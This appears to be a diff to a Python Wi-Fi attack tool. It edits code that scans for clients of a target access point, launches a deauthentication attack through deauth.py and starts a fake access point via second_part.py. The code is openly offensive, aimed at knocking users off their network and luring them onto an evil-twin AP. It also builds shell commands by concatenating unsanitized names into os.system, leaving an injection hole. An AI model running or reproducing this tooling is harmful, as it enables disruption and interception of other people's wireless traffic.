@@ -200,13 +200,11 @@ def client_scan():
 ### Same as 'ap_scan_pkt()' but for the clients. 
 def client_scan_pkt(pkt):
     global client_list
-    """   if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and \
-            pkt.addr1 != "ff:ff:ff:ff:ff:ff": """
     if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
         if pkt.addr1 not in client_list:
             if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                 client_list.append(pkt.addr1)
-                print("Client with MAC address :" + pkt.addr1 + " was found.")
+                print("Client with MAC address: " + pkt.addr1 + " was found.")
 
 
 
@@ -224,6 +222,7 @@ def deauth_attack():
     print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
     empty = input ("Press Enter to start sending the Deauthentication packets.........\n")
     print(W)
+    os.system('gnome-terminal -- sh -c "python3 second_part.py "' +  ap_name)
     os.system('python3 deauth.py ' + client_mac + ' ' + ap_mac + ' ' + interface)
 
 
@@ -255,7 +254,10 @@ if __name__ == "__main__":
     
     ##### Part 2: Set up & upload fake AP.
     print(W)
-    os.system('python3 second_part.py ' + ap_name) 
+    # os.system('python3 second_part.py ' + ap_name) 
+    # os.system('gnome-terminal -- sh -c "python3 k1.py "' + z )
+    # run_second_part = "python3 second_part.py " + ap_name
+    # os.system('gnome-terminal -- sh -c "python3 second_part.py "' +  ap_name)
     
 
 
